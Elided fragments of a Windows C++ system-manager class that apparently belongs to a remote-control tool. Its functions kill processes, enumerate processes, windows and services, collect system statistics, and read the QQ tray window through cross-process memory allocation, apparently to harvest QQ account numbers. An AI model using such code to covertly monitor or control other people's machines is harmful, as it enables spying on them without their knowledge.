...
void CMySystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
{
	...
	{
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, *(LPDWORD)(lpBuffer + i));
...
LPBYTE CMySystemManager::getProcessList()
{
	...
	typedef BOOL(WINAPI *QueryFullProcessImageName) (HANDLE lphProcess, DWORD dwFlags, LPTSTR lpExeName, PDWORD lpdwSize);
	...
	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			...
			DWORD dwLength = sizeof(DWORD) + (lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2) * sizeof(TCHAR);
...
bool CALLBACK CMySystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	...
	DWORD dwLength = sizeof(DWORD) + (lstrlen(strTitle) + 1) * sizeof(TCHAR);
...
{
	DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResume = 0, dwOffset = 1;

	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024 * 64);
	lpBuffer[0] = TOKEN_SVLIST;

	SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS | SC_MANAGER_ENUMERATE_SERVICE);
	...
	{
		SC_HANDLE hService = OpenService(hSCM, lpServices[dwIndex].lpServiceName, SC_MANAGER_ALL_ACCESS);
		if (hService)
		{
			QUERY_SERVICE_CONFIG emConfig;
			QueryServiceConfig(hService, &emConfig, sizeof(QUERY_SERVICE_CONFIG), &dwBytesNeeded);

			DWORD dwLength = (lstrlen(lpServices[dwIndex].lpServiceName) + lstrlen(lpServices[dwIndex].lpDisplayName) + 2) * sizeof(TCHAR) + sizeof(DWORD) + sizeof(DWORD);
...
LPSTR CMySystemManager::GetQQ(char lpQQBuffer[])
{
	...
	HWND hWndTmp = FindWindowExA(hWnd, 0, "SysPager", NULL);
	...
	long ret = GetWindowThreadProcessId(hWnd, &lngPID);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, lngPID);

	LPVOID lngAddress = VirtualAllocEx(hProcess, 0, 0x4096, MEM_COMMIT, PAGE_READWRITE);//0x02e60000
	long lngButtons = SendMessage(hWnd, TB_BUTTONCOUNT, 0, 0);
...
void CMySystemManager::GetSystemInfo(tagSystemInfo* pSysInfo)
{
	...
	double dSize = (double)(signed __int64)Meminfo.ullTotalPhys;
	dSize /= 1024.0;
	dSize /= 1024.0;
	dSize += 0.5;
	...
	DWORD dwDay = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	DWORD dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	DWORD dwMin = dwTime / (1000 * 60);
	...
	{
		int iSec = (GetTickCount() - liInfo.dwTime) / 1000;
		int iMin = iSec / 60;
		iSec = iSec % 60;
		int iHour = iMin / 60;
		iMin = iMin % 60;
	...
	if (EnumProcesses(dwIDProcess, sizeof(dwIDProcess), &cbNeeded))//枚举系统进程ID列表
	{
		...
		{
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwIDProcess[i]);
			if (hProcess)
			{
	...
	double dfreespace = (signed __int64)(freespace / (1024 * 1024 * 1024));
	double dtotalspace = (signed __int64)(totalspace / (1024 * 1024 * 1024));
